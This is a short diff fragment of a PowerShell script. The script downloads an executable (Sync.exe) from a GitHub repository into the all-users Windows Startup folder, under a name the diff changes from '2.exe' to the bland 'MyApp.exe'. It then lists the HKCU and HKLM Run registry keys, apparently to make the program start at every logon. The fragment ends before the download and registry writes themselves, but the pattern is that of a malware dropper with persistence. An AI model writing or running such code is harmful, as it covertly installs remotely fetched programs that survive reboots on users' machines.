@@ -1,5 +1,5 @@
 $sourceUrl = "https://github.com/prince-spooler/FYP/raw/main/Sync.exe"
-$destinationPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\2.exe"
+$destinationPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MyApp.exe"
 $registryLocations = @(
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
     "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
